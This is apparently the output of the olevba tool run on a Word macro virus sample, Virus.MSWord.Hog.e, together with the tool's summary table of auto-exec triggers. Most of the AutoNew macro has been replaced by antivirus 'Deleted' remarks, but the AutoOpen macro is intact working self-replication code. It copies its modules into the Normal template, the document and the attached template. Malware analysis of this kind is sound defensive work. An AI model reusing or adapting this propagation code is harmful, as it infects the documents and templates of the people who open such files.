olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Hog.e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Hog.e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoNew.bas 
in file: Virus.MSWord.Hog.e - OLE stream: 'Macros/VBA/AutoNew'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Rem Del
Rem Del
Rem Del
Rem Del
Rem Del
Rem Deleted b



Sub main()
    Rem Deleted by AVP  D
    Rem Deleted by AVP  D
    
    Rem
  
    Rem Deleted
    Rem Deleted by AVP  Delet
    
    Rem Deleted
    Rem Deleted by AVP  Delet
    
    Rem Deleted
    Rem Deleted by AVP  Delet
    
    Rem Deleted
        Rem Del
        Rem Deleted by AVP  D
    End
        
    
   Rem Deleted by AV
   
   Rem Deleted by AVP  Deleted by AVP  Deleted by AVP  Deleted
        
   Rem Deleted by AVP  Deleted by AVP  Deleted by AVP  Deleted
        
   Rem Deleted by AVP  Deleted by AVP  Deleted by AVP  Deleted

    Rem Delet
    Rem Delet

End Sub

-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Hog.e - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim nor$
Dim doc$
Dim tem$
Dim mac$
Dim em
Dim ar$(2)



Sub main()
    ar$(1) = "AutoNew"
    ar$(2) = "AutoOpen"
    
    On Error Resume Next
    
    With ActiveDocument
        For i = 1 To .Sections.Count
            With .Sections(i)
                For j = 0 To .Headers.Count
                
                Next j
            End With
        Next i
    End With
       
    mac$ = MacroContainer.Path
    mac$ = mac$ & "\" & MacroContainer.Name
    
    nor$ = NormalTemplate.Path
    nor$ = nor$ & "\" & NormalTemplate.Name
    
    doc$ = ActiveDocument.Path
    doc$ = doc$ & "\" & ActiveDocument.Name
    
    
    With ActiveDocument.AttachedTemplate
        tem$ = .Path
        tem$ = tem$ & "\" & .Name
    End With
        
    
   For n% = 1 To 2
   
   Application.OrganizerCopy Source:=mac$, _
        Destination:=nor$, Name:=ar$(n%), _
        Object:=wdOrganizerObjectProjectItems
        
   Application.OrganizerCopy Source:=mac$, _
        Destination:=ActiveDocument, Name:=ar$(n%), _
        Object:=wdOrganizerObjectProjectItems
        
   Application.OrganizerCopy Source:=mac$, _
        Destination:=tem$, Name:=ar$(n%), _
        Object:=wdOrganizerObjectProjectItems

    Next n%
    
    ActiveDocument.Save

End Sub



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

